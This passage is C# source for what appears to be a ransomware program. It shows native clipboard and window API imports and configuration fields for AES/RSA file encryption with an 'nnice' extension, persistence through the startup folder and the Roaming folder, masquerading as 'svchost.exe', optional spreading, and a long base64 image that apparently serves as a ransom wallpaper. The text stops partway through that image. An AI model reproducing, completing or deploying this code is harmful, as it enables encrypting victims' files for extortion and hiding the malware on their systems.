using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "nnice";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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